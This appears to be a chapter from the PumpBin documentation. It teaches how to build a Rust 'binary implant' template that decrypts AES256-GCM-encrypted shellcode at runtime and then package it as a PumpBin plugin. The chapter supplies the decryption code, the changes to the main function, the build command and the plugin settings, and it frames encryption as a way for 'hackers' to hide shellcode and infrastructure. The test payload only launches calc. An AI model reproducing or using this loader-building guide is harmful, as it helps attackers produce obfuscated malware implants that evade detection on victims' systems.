# Encryption

In this chapter, we will optimize the plugin created in the previous chapter and use AES256-GCM to encrypt the shellcode.

Most hackers would want to encrypt their shellcode, and no one would want to expose their infrastructure.

## Create binary implant template

To create a plugin with encryption, our binary implant template needs to implement the corresponding decryption logic.

We will change it based on the code in the [previous chapter](https://github.com/pumpbin/pumpbin/tree/main/examples/create_thread).

Add the following dependencies to the end of the Cargo.toml file

```toml
aes-gcm = "0.10.3"
```

Add the following decryption function above the main function in main.rs

```rust
fn decrypt(data: &[u8]) -> Vec<u8> {
    const KEY: &[u8; 32] = b"$$KKKKKKKKKKKKKKKKKKKKKKKKKKKK$$";
    const NONCE: &[u8; 12] = b"$$NNNNNNNN$$";

    let aes = Aes256Gcm::new_from_slice(KEY).unwrap();
    let nonce = Nonce::from_slice(NONCE);
    aes.decrypt(nonce, data).unwrap()
}
```

Two of them are array references wrapped in `$$`, which have already appeared in the previous chapter. They are two `Place Holder`, which are used by PumpBin to locate placeholder data.
(`Place Holder` is a fixed size, `Prefix` is a dynamic size, so in the previous chapter, Size Holder is needed to determine the real length of the shellcode, and the Max Len field is also needed)

Add the following code after the fourth line of the main function in main.rs

```rust
let shellcode = decrypt(shellcode);
```

The main function after the addition is complete is as follows

```rust
fn main() {
    let shellcode = include_bytes!("../shellcode");
    const SIZE_HOLDER: &str = "$$99999$$";
    let shellcode_len = usize::from_str_radix(SIZE_HOLDER, 10).unwrap();
    let shellcode = &shellcode[0..shellcode_len];
    let shellcode = decrypt(shellcode);
    let shellcode_size = shellcode.len();
    ...
```

Compiling the modified `create_thread` project, we will get a binary implant template that uses AES256-GCM to decrypt the shellcode.

```sh
cargo b -r
```

## Create Plugin

We use PumpBin Maker to create the plugin. The steps are the same as in the previous chapter, except that we also need an Extism plug-in that implements the corresponding decryption logic.

The [plug-in](https://github.com/pumpbin/plug-in) repository collects reusable PumpBin Extism Plug-ins, including the [aes256-gcm](https://github.com/pumpbin/plug-in/tree/main/encrypt_shellcode/aes256-gcm) Extism Plug-in.

Instructions on how to use it are provided in README.md

> key: `$$KKKKKKKKKKKKKKKKKKKKKKKKKKKK$$`\
> nonce: `$$NNNNNNNN$$`

We need to use a specific key and nonce as a `Place Holder` in the decryption function of the binary implant template, which we have already done.
(If you have previously modified the KEY or NONCE in the decryption function, you need to start again from the step of adding the decryption function)

Download the compiled [aes256_gcm.wasm](https://github.com/pumpbin/plug-in/releases) and enter the file path into the `Encrypt Shellcode Plug-in` input box in PumpBin Maker.
(You can also use the file selection dialog to select the downloaded `aes256_gcm.wasm` file)

> Plugin Name: Enter first_plugin. (This field is the unique identifier for the plugin, which means that users cannot install two plugins with the same name at the same time.)

> Prefix: Enter `$$SHELLCODE$$`. (This is the `Prefix` of the shellcode placeholder data we used above. You can use any `Prefix` you like, as long as it is unique or the first one to be matched.)

> Max Len: Fill in the total size of the shellcode placeholder data, which in this case should be 1024\*1024 + the size of the prefix = 1048589. (Unit: Bytes)

> Type: Select `Local`, Size Holder: Fill in `$$99999$$`.
> (This is the constant string reference we used above to determine the length of the shellcode. You can use any Size Holder you like. The rules are the same as above.)

> Windows Exe: Select the binary implant template we compiled above. (You can also directly enter the file path)

> Click Generate, save the generated b1n file

## Test Plugin

Install the plugin created with PumpBin and use `w64-exec-calc-shellcode-func` to generate a final implant. Running it should see the calc program launched.

At this point, we have created a plugin of type `Local` that uses the AES256-GCM encryption method

In the previous two chapters, I always quoted `Local` to remind you that it is a keyword. It is very important to understand them correctly when using PumpBin.

In the next chapter, we will create our first plugin of type "Remote". This allows the shellcode to be hosted on a remote server.

The complete project file for this example is available in the PumpBin code repository at [examples/create_thread_encrypt](https://github.com/pumpbin/pumpbin/blob/main/examples/create_thread_encrypt/src/main.rs).
